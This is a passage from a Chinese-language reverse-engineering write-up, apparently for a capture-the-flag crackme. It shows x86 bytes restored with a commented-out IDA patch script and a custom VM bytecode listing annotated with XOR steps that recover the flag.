0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x34, 0x75, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x83, 0xC0, 0x01, 0x0F, 0xB6, 0x00, 0x0F, 0xB6, 0xD0, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x08, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x02, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xFE, 0x75, 0x1B, 0x8B, 0x45, 0xD4, 0x8B, 0x50, 0x24, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0x11, 0x75, 0x26, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x04, 0x83, 0xEC, 0x08, 0x50, 0x68, 0x40, 0x93, 0x04, 0x08, 0xE8, 0x5C, 0xF8, 0xFF, 0xFF, 0x83, 0xC4, 0x10, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xA0, 0x75, 0x28, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x04, 0x3D, 0x67, 0xF9, 0xEB, 0x6F, 0x75, 0x11, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0xEB, 0x0A, 0x83, 0xEC, 0x0C, 0x6A, 0x00, 0xE8, 0x55, 0xF8, 0xFF, 0xFF, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xA1, 0x75, 0x42, 0x83, 0xEC, 0x04, 0x6A, 0x2C, 0x68, 0x40, 0xB3, 0x04, 0x08, 0x6A, 0x00, 0xE8, 0xE7, 0xF7, 0xFF, 0xFF, 0x83, 0xC4, 0x10, 0x83, 0xEC, 0x0C, 0x68, 0x40, 0xB3, 0x04, 0x08, 0xE8, 0x37, 0xF8, 0xFF, 0xFF, 0x83, 0xC4, 0x10, 0x83, 0xF8, 0x2C, 0x74, 0x0A, 0x83, 0xEC, 0x0C, 0x6A, 0x00, 0xE8, 0x15, 0xF8, 0xFF, 0xFF, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xB1, 0x75, 0x1B, 0x8B, 0x15, 0x80, 0xB0, 0x04, 0x08, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xB2, 0x75, 0x1B, 0x8B, 0x15, 0x84, 0xB0, 0x04, 0x08, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xA4, 0x75, 0x37, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x83, 0xC0, 0x01, 0x0F, 0xB6, 0x00, 0x0F, 0xB6, 0xC0, 0x89, 0x45, 0xE4, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x04, 0x89, 0x45, 0xE8, 0x8B, 0x55, 0xE8, 0x8B, 0x45, 0xE4, 0x89, 0x14, 0x85, 0x80, 0xB0, 0x04, 0x08, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xB3, 0x75, 0x1B, 0x8B, 0x15, 0x88, 0xB0, 0x04, 0x08, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xB4, 0x75, 0x1B, 0x8B, 0x15, 0x8C, 0xB0, 0x04, 0x08, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x24, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xC1, 0x75, 0x35, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x83, 0xC0, 0x01, 0x0F, 0xB6, 0x00, 0x0F, 0xB6, 0xC0, 0x89, 0x45, 0xEC, 0x8B, 0x45, 0xEC, 0x05, 0x40, 0xB3, 0x04, 0x08, 0x0F, 0xB6, 0x00, 0x0F, 0xB6, 0xD0, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x04, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x02, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xC7, 0x75, 0x2B, 0x8B, 0x15, 0x60, 0xB0, 0x04, 0x08, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x04, 0x39, 0xC2, 0x75, 0x11, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0xEB, 0x0A, 0x83, 0xEC, 0x0C, 0x6A, 0x00, 0xE8, 0xA8, 0xF6, 0xFF, 0xFF, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xC8, 0x75, 0x2B, 0x8B, 0x15, 0x64, 0xB0, 0x04, 0x08, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x04, 0x39, 0xC2, 0x75, 0x11, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x01, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0xEB, 0x0A, 0x83, 0xEC, 0x0C, 0x6A, 0x00, 0xE8, 0x70, 0xF6, 0xFF, 0xFF, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x0F, 0xB6, 0x00, 0x3C, 0xC2, 0x0F, 0x85, 0xCF, 0xF8, 0xFF, 0xFF, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x83, 0xC0, 0x01, 0x8B, 0x00, 0x89, 0x45, 0xF0, 0x8B, 0x45, 0xF0, 0x0F, 0xB6, 0xD0, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x04, 0x39, 0xC2, 0x74, 0x0A, 0x83, 0xEC, 0x0C, 0x6A, 0x00, 0xE8, 0x37, 0xF6, 0xFF, 0xFF, 0x8B, 0x45, 0xD4, 0x8B, 0x40, 0x20, 0x8D, 0x50, 0x05, 0x8B, 0x45, 0xD4, 0x89, 0x50, 0x20, 0xE9, 0x93, 0xF8, 0xFF, 0xFF, 0x90, 0x90, 0x8B, 0x45, 0xF4, 0x65, 0x33, 0x05, 0x14, 0x00, 0x00, 0x00, 0x74, 0x05, 0xE8, 0xF0, 0xF5, 0xFF, 0xFF, 0x8B, 0x5D, 0xFC, 0xC9]</span><br><span class="hljs-comment"># start = 0x80487A8</span><br><span class="hljs-comment"># for i in range(len(ss)):</span><br><span class="hljs-comment">#     idc.PatchByte(start + i, ss[i])</span><br></code></pre></td></tr></table></figure><p>然后分析vm，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xA1</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>A, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>b^<span class="hljs-number">0</span>x<span class="hljs-number">4</span>a=<br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>^<span class="hljs-number">0</span>x<span class="hljs-number">2</span>f=<br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>xDD, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>xe<span class="hljs-number">8</span>^<span class="hljs-number">0</span>xdd=<br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">03</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>f^<span class="hljs-number">0</span>x<span class="hljs-number">37</span>=<br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">04</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">05</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">89</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">06</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">07</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">54</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">08</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">09</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>A, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>B, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">56</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>C, <span class="hljs-number">0</span>xB<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">8</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>D, <span class="hljs-number">0</span>xB<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">49</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>,<br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>E, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>F, <span class="hljs-number">0</span>xB<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">10</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">06</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">54</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">12</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>A, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">13</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">42</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">14</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">15</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">16</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">52</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>xDB, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">18</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>xD<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>A, <span class="hljs-number">0</span>xB<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>,<br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>B, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>C, <span class="hljs-number">0</span>xB<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>D, <span class="hljs-number">0</span>xB<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>E, <span class="hljs-number">0</span>xB<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>F, <span class="hljs-number">0</span>xB<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">18</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span 